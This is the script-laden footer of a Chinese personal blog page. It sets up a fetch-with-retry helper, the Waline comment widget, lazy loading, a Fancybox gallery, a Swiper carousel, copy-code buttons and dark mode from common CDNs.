        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
      }
    },
    onLoadSuccess: (el) => {
      if (el) {
        $(el).find('.loading-wrap').remove();
      }
    },
    onLoadFailure: (el) => {
      if (el) {
        $(el).find('.loading-wrap svg').remove();
        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
        $(el).find('.loading-wrap').addClass('error');
      }
    },
    request: (el, url, callback, onFailure) => {
      let retryTimes = 3;
      utils.onLoading(el);
      function req() {
        return new Promise((resolve, reject) => {
          let status = 0; // 0 等待 1 完成 2 超时
          let timer = setTimeout(() => {
            if (status === 0) {
              status = 2;
              timer = null;
              reject('请求超时');
              if (retryTimes == 0) {
                onFailure();
              }
            }
          }, 5000);
          fetch(url).then(function(response) {
            if (status !== 2) {
              clearTimeout(timer);
              resolve(response);
              timer = null;
              status = 1;
            }
            if (response.ok) {
              return response.json();
            }
            throw new Error('Network response was not ok.');
          }).then(function(data) {
            retryTimes = 0;
            utils.onLoadSuccess(el);
            callback(data);
          }).catch(function(error) {
            if (retryTimes > 0) {
              retryTimes -= 1;
              setTimeout(() => {
                req();
              }, 5000);
            } else {
              utils.onLoadFailure(el);
              onFailure();
            }
          });
        });
      }
      req();
    },
  };
</script>

<script>
  const sidebar = {
    leftbar: () => {
      if (l_body) {
        l_body.toggleAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    rightbar: () => {
      if (l_body) {
        l_body.toggleAttribute('rightbar');
        l_body.removeAttribute('leftbar');
      }
    },
    dismiss: () => {
      if (l_body) {
        l_body.removeAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    toggleTOC: () => {
      document.querySelector('#data-toc').classList.toggle('collapse');
    }
  }
</script>

<!-- required -->
<script src="/js/main.js?v=1.27.0" async></script>

<!-- optional -->

  <script type="module">
  import { init } from 'https://unpkg.com/@waline/client@v3/dist/waline.js'

  function load_comment(){
    if(!document.getElementById("waline_container"))return;

    utils.css('https://unpkg.com/@waline/client@v3/dist/waline.css');
    utils.css('https://gcore.jsdelivr.net/npm/@waline/client@3.1.2/dist/waline-meta.css');

    const el = document.getElementById("waline_container");
    var path = el.getAttribute('comment_id');
    if (!path) {
      path = decodeURI(window.location.pathname);
    }

    const waline = init(Object.assign({"js":"https://unpkg.com/@waline/client@v3/dist/waline.js","css":"https://unpkg.com/@waline/client@v3/dist/waline.css","meta_css":"https://gcore.jsdelivr.net/npm/@waline/client@3.1.2/dist/waline-meta.css","serverURL":"https://www.regret.live","commentCount":true,"pageview":false,"locale":{"placeholder":"有什么想说的？大胆说出来吧(*^_^*)","reactionTitle":"请给这篇文章做个评价吧","reaction0":"感兴趣","reaction1":"给心心","reaction2":"什么？","reaction3":"心碎了","reaction4":"别过来","reaction5":"矮油~","reaction6":"不忍直视","reaction7":"我真生气辣！","reaction8":"摇晃","level0":"潜水","level1":"冒泡","level2":"吐槽","level3":"活跃","level4":"话痨","level5":"传说"},"reaction":["/emojis/ablobcatattentionreverse.png","/emojis/ablobcatheart.png","/emojis/ablobcatdoubt.png","/emojis/ablobcatheartbroken.png","/emojis/ablobcatterrified.png","/emojis/ablobcatshy.png","/emojis/ablobcatnoface.png","/emojis/ablobcatanger.gif","/emojis/ablobcatrainbow.png"],"emoji":["https://gcore.jsdelivr.net/gh/norevi/waline-blobcatemojis@1.0/blobs"]}, {
      el: '#waline_container',
      path: path,
      
    }));

  }
  window.addEventListener('DOMContentLoaded', (event) => {
    load_comment();
  });

</script>




<script defer>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
    for (let id of Object.keys(ctx.services)) {
      const js = ctx.services[id].js;
      if (id == 'siteinfo') {
        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
        if (ctx.cardlinks?.length > 0) {
          utils.js(js, { defer: true }).then(function () {
            setCardLink(ctx.cardlinks);
          });
        }
      } else {
        const els = document.getElementsByClassName(`ds-${id}`);
        if (els?.length > 0) {
          utils.jq(() => {
            if (id == 'timeline' || 'memos' || 'marked') {
              utils.js(deps.marked).then(function () {
                utils.js(js, { defer: true });
              });
            } else {
              utils.js(js, { defer: true });
            }
          });
        }
      }
    }
  });
</script>

<script>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.search = {
      path: `/search.json`,
    }
    utils.js('/js/search/local-search.js', { defer: true });
  });
</script><script>
  window.FPConfig = {
    delay: 0,
    ignoreKeywords: [],
    maxRPS: 5,
    hoverDelay: 25
  };
</script>
<script defer src="https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"></script><script defer src="https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js"></script>
<script>
  // https://www.npmjs.com/package/vanilla-lazyload
  // Set the options globally
  // to make LazyLoad self-initialize
  window.lazyLoadOptions = {
    elements_selector: ".lazy",
  };
  // Listen to the initialization event
  // and get the instance of LazyLoad
  window.addEventListener(
    "LazyLoad::Initialized",
    function (event) {
      window.lazyLoadInstance = event.detail.instance;
    },
    false
  );
  document.addEventListener('DOMContentLoaded', function () {
    window.lazyLoadInstance?.update();
  });
</script><script>
  ctx.fancybox = {
    selector: `.swiper-slide img, .gallery img ,#waline_container .vcontent img`,
    css: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css`,
    js: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js`
  };
  var selector = '[data-fancybox]:not(.error)';
  if (ctx.fancybox.selector) {
    selector += `, ${ctx.fancybox.selector}`
  }
  var needFancybox = document.querySelectorAll(selector).length !== 0;
  if (!needFancybox) {
    const els = document.getElementsByClassName('ds-memos');
    if (els != undefined && els.length > 0) {
      needFancybox = true;
    }
  }
  if (needFancybox) {
    utils.css(ctx.fancybox.css);
    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
      Fancybox.bind(selector, {
        hideScrollbar: false,
        Thumbs: {
          autoStart: false,
        },
        caption: (fancybox, slide) => {
          return slide.triggerEl.alt || null
        }
      });
    })
  }
</script><script>
  window.addEventListener('DOMContentLoaded', (event) => {
    const swiper_api = document.getElementById('swiper-api');
    if (swiper_api != undefined) {
      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
        const effect = swiper_api.getAttribute('effect') || '';
        var swiper = new Swiper('.swiper#swiper-api', {
          slidesPerView: 'auto',
          spaceBetween: 8,
          centeredSlides: true,
          effect: effect,
          loop: true,
          pagination: {
            el: '.swiper-pagination',
            clickable: true,
          },
          navigation: {
            nextEl: '.swiper-button-next',
            prevEl: '.swiper-button-prev',
          },
        });
      })
    }
  });
</script><script>
  document.addEventListener('DOMContentLoaded', function () {
    window.codeElements = document.querySelectorAll('.code');
    if (window.codeElements.length > 0) {
      ctx.copycode = {
        default_text: `Copy`,
        success_text: `Copied`,
        toast: `复制成功`,
      };
      utils.js('/js/plugins/copycode.js');
    }
  });
</script>


<!-- inject -->
<script type="text/javascript" src="/js/darkmode.js"></script>
</div></body></html>
